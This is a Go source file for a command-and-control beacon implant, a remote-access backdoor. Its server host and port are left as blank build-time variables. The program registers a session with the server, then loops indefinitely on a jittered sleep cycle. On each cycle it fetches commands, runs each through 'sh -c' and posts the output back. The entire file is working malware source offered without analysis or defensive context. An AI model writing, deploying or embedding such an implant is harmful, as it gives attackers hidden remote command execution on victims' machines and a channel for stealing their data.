package main

import (
	"crypto/rand"
	b32 "encoding/base32"
	"fmt"
	"net/http"
	"net/url"
	"time"
	"strconv"
	"os/exec"
	"encoding/json"
	r "math/rand"
	"bufio"
	"strings"
	"bytes"
)

var lhost = ""
var lport = ""
var heartbeat = ""
var jitter = ""

type CommandResult struct {
	Input  string `json:"input"`
	Output string `json:"output"`
}

type Batch struct {
	Results []CommandResult `json:"results"`
}

func generateSessionId() (string, error) {
	bytes := make([]byte, 32)
	_, err := rand.Read(bytes)
	if err != nil {
		return "", err
	}
	return b32.StdEncoding.EncodeToString(bytes)[:32], nil
}

func process(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}
	return string(output[:]), nil
}

func sleepWakeCycle(serverAddr string, sessionID string) {
	sleepInterval, _ := strconv.Atoi(heartbeat)
	jitter, _ := strconv.Atoi(jitter)
	min := -1 * jitter

	for { // do the sleep wake cycle indefinitely
		j := float64(min) + r.Float64() * float64((jitter - min))

		time.Sleep(time.Duration(float64(sleepInterval) + j) * time.Second)

		resp, _ := http.Get("http://"+serverAddr+"/beacon/getCommands/"+sessionID)

		results := []CommandResult{}

		scanner := bufio.NewScanner(resp.Body)
		for scanner.Scan() {
			line := scanner.Text()
			if line == "" {
				continue
			}
			if strings.HasPrefix(line, "data: ") {
				cmd := strings.TrimPrefix(line, "data: ")
				
				c := CommandResult{Input: cmd}

				output, err := process(cmd)

				if err != nil {
					c.Output = err.Error()
				} else {
					c.Output = output
				}

				results = append(results, c)
			}
		}
		resp.Body.Close()

		batch := Batch{Results: results}
		body, _ := json.Marshal(batch)
		resp, _ = http.Post("http://"+serverAddr+"/beacon/response/"+sessionID, "application/json", bytes.NewReader(body))
		resp.Body.Close()
	}
}

func main() {
	serverAddr := lhost + ":" + lport

	sessionID, err := generateSessionId()
	if err != nil {
		return
	}

	resp, err := http.PostForm("http://"+serverAddr+"/createSession", url.Values{"sid": {sessionID}, "type": {"0"}})
	if err != nil {
		fmt.Println(err)
	}
	resp.Body.Close()

	sleepWakeCycle(serverAddr, sessionID)
}
